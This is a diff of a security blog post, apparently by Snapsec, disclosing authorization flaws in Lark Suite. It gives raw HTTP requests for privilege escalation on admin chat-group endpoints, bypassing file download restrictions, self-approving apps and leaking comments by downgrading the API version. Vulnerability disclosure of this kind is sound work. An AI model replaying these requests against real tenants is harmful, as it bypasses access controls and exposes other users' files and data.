@@ -82,6 +82,13 @@ Once *Super Admin* added another user he was only able to *access the company in
 
 ```http
 GET  /suite/admin/space_manage/user_folder?userID=6782777787976515850  HTTP/1.1
+Host: unzftv7n88.larksuite.com
+Connection: close
+X-Timezone-Offset: 600
+X-Csrf-Token: [Value]
+credentials: same-origin
+Cache-Control: no-cache
+Cookie:[Value]
 ```
 
 ![1](/blog/assets/images/lark/1/2.png)
@@ -93,10 +100,10 @@ GET  /suite/admin/space_manage/user_folder?userID=[UserId]&parentToken=[PToken] 
 Host: unzftv7n88.larksuite.com
 Connection: close
 X-Timezone-Offset: 600
-X-Csrf-Token: <value>
+X-Csrf-Token: [Value]
 credentials: same-origin
 Cache-Control: no-cache
-Cookie:<value>
+Cookie:[Value]
 
 ```
 The response of this request returned us all of the *files* inside that parent directoryand we were able to *view the files inside that folder*.
@@ -110,10 +117,10 @@ POST  /suite/admin/space_manage/user_folder  HTTP/1.1
 Host: unzftv7n88.larksuite.com
 Connection: close
 X-Timezone-Offset: 600
-X-Csrf-Token: <value>
+X-Csrf-Token: [Value]
 credentials: same-origin
 Cache-Control: no-cache
-Cookie:<value>
+Cookie:[Value]
 
 
 ```
@@ -139,11 +146,11 @@ We sent this `http` request and returned us the *data of the* all of the groups 
 GET  /suite/admin/tenant/chatSetting?_t=1603952121293  HTTP/1.1
 Host: unzftv7n88.larksuite.com
 Connection: close
-X-Csrf-Token: <VALUE>
+X-Csrf-Token: [Value]
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
 credentials: same-origin
 Content-Type: application/json;charset=UTF-8
-Cookie: <VALUE>
+Cookie: [Value]
 
 ```
 Spending a time with this *unusual behaviour* we found a few more *issues* on this feature. As an unprivileged user we were ablt to escalate our *privileges* and we identified various issues which are as *under*:
@@ -153,11 +160,11 @@ Spending a time with this *unusual behaviour* we found a few more *issues* on th
 POST /suite/admin/tenant/chat HTTP/1.1
 Host: unzftv7n88.larksuite.com
 Connection: close
-X-Csrf-Token: <VALUE>
+X-Csrf-Token: [Value]
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
 credentials: same-origin
 Content-Type: application/json;charset=UTF-8
-Cookie: <VALUE>
+Cookie: [Value]
 
 {"employeeTypes":[1,2,3,4,5],"chatName":"imranparrayx"}
 ```
@@ -168,11 +175,11 @@ Cookie: <VALUE>
 PATCH /suite/admin/tenant/chat HTTP/1.1
 Host: unzftv7n88.larksuite.com
 Connection: close
-X-Csrf-Token: <VALUE>
+X-Csrf-Token: [Value]
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
 credentials: same-origin
 Content-Type: application/json;charset=UTF-8
-Cookie: <VALUE>
+Cookie: [Value]
 
 {"employeeTypes":[1,2,4,5],"ownerID":"6782777787976515850","chatName":"Admins-Group"}
 ```
@@ -183,11 +190,11 @@ Cookie: <VALUE>
 POST /suite/admin/tenant/dissolve_chat HTTP/1.1
 Host: unzftv7n88.larksuite.com
 Connection: close
-X-Csrf-Token: <VALUE>
+X-Csrf-Token: [Value]
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
 credentials: same-origin
 Content-Type: application/json;charset=UTF-8
-Cookie: <VALUE>
+Cookie: [Value]
 
 ```
 
@@ -198,11 +205,11 @@ Cookie: <VALUE>
 POST /suite/admin/tenant/normalize_chat HTTP/1.1
 Host: unzftv7n88.larksuite.com
 Connection: close
-X-Csrf-Token: <VALUE>
+X-Csrf-Token: [Value]
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
 credentials: same-origin
 Content-Type: application/json;charset=UTF-8
-Cookie: <VALUE>
+Cookie: [Value]
 
 ```
 
@@ -250,7 +257,7 @@ In this case *we shared our file* with a user and *restricted the download permi
 
 We were able to bypass this restriction simply by *sending this http request*:
 ```http
-GET  /space/api/box/stream/download/all/<<file id>>/  HTTP/1.1
+GET  /space/api/box/stream/download/all/[file-id]/  HTTP/1.1
 Host: internal-api-space.larksuite.com
 x-command: space.api.box.file.info
 Content-Type: application/json
@@ -261,7 +268,7 @@ In the response of this request we got the *downlaod url of the file* and pastin
 
 Download URL will look something like this:
 
-Url will look like `https://internal-api-space.larksuite.com/space/api/box/stream/download/all/<<file id>>/`
+Url will look like `https://internal-api-space.larksuite.com/space/api/box/stream/download/all/[file-id]/`
 
 
 
@@ -335,7 +342,7 @@ Admins can add a user with *App management permission* on a specific *app* and o
 Since we know user couldn't approve an app by himslef so noticed a request *that was responsible for approving the application*, it looked something like this:
 
 ```http
-PUT /suite/admin/appcenter/app/<<application id>>/auditWhiteList HTTP/1.1
+PUT /suite/admin/appcenter/app/[App-id]/auditWhiteList HTTP/1.1
 Host: larksuite1.larksuite.com 
 Connection: close Content-Length: 29 
 
@@ -397,3 +404,9 @@ Analyzing the *comment request* of a file, we found a **GET request**  returned 
  In an instance we changed the *v3 to v2* and we got all of the comments of the *file in a response*. This is how *another version of api* leaked the commenst to the attacker.
 
 
+
+## About us
+
+Snapsec is a team of security experts specialized in providing pentesting and other security services to secure your online assets. We have a specialized testing methodology which ensures indepth testing of your business logic and other latest vulnerabilities. 
+
+ If you are looking for a team which values your security and ensures that you are fully secure against online security threats, feel free to get in touch with us #[support@snapsec.co](mailto:support@snapsec.co)
